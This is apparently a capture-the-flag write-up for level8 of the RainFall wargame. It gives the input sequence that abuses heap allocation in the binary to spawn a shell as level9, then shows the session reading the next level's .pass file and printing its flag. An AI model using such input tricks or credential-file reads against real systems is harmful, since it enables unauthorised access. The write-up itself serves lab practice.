No payload.sh on this level the only steps to follow is:
- Execute level8
- Type "auth lala"
- Type "servic aaaabbbbccccdddd"
- Type "login"

And you arrive on the new shell where you can find the flag:

```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth lala
0x804a008, (nil) 
servic aaaabbbbccccdddd
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
